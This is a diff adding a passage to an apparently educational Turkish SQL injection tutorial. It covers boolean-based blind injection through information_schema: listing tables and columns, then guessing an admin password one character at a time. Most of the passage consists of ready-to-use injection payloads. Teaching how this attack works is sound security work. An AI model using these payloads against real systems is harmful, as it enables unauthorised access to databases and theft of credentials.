@@ -261,3 +261,47 @@ test' AND database() LIKE 'a%';--
 - Değilse, 'b', 'c' ... şeklinde diğer harfler denenir.
 
 Bu şekilde, veritabanı adının tüm karakterleri, her seferinde tek bir harf deneyerek bulunur.
+
+Şimdi benzer bir yöntem ile information_schema veritabanını kullanarak tablo adlarını sıralayabiliriz
+
+```sql
+test' UNION SELECT null,null,null FROM information_schema.tables where table_schema='table_name' AND table_name like 'a%';-- -
+```
+Bu sorgu information_schema veritabanındaki tablolar tablosunda veri tabanı adının işleştiği ve tablo adının a ile başladığı sonuçları arar. Önceki gibi harfleri sayılar ve karakterleri döngü yapmamız ve pozitif bir eşleşme bulana kadaar devam etmemiz gerkecek
+
+Tabloları Listeleme (information_schema)
+
+information_schema.tables kullanarak tablo adlarını öğrenebiliriz:
+
+```sql
+test' UNION SELECT NULL,NULL,NULL 
+FROM information_schema.tables 
+WHERE table_schema='database_name' 
+AND table_name LIKE 'a%';-- -
+```
+
+Bu sorgu, belirtilen veritabanındaki tabloları listeler. Harf harf deneyerek tüm tablo adları elde edilir.
+Kolonları Listeleme
+
+Tablolar bulunduktan sonra, information_schema.columns ile kolon isimleri öğrenilir:
+
+```sql
+test' UNION SELECT NULL,NULL,NULL 
+FROM information_schema.columns 
+WHERE table_schema='database_name' 
+AND table_name='table_name' 
+AND column_name LIKE 'a%';-- -
+```
+
+Aynı şekilde karakter karakter test ederek kolon isimleri elde edilir.
+Veri Çekme
+
+Kolon adları öğrenildikten sonra hedef veriyi boolean mantığı ile çekebiliriz.
+Örneğin users tablosundan admin kullanıcısının şifresini almak:
+```sql
+test' UNION SELECT NULL,NULL,NULL 
+FROM users 
+WHERE username='admin' 
+AND password LIKE 'a%';-- -
+```
+Her karakter test edilerek, tam parola ortaya çıkar.
